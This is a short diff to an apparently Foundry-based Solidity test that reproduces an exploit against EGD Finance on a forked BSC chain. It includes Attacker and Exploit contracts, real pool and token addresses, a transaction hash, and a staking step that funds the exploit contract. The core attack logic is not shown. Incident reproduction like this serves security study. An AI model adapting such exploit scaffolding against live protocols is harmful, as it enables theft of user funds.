@@ -30,7 +30,7 @@ address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;
 contract Attacker is Test {
     Exploit exploit = new Exploit();
 
-    function setUp() public {
+    constructor() {
         cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
         cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
         cheat.label(address(pancakeRouter), "pancakeRouter");
@@ -38,7 +38,7 @@ contract Attacker is Test {
         cheat.label(usdt, "USDT");
         cheat.label(egd, "EGD");
 
-        console.log("--------------------  Pre-work, stake 10 USDT to EGD Finance --------------------");
+        console.log("--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------");
         console.log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8");
         cheat.createSelectFork("bsc", 20245522);
         console.log("Attacker Stake 100 USDT to EGD Finance");
@@ -69,7 +69,7 @@ contract Exploit is Test{
 
     function stake() public {
         // Give exploit contract 100 USDT
-        stdstore.target(usdt)
+        stdstore.target(address(usdt))
                 .sig(IERC20(usdt).balanceOf.selector)
                 .with_key(address(this))
                 .checked_write(100 ether);
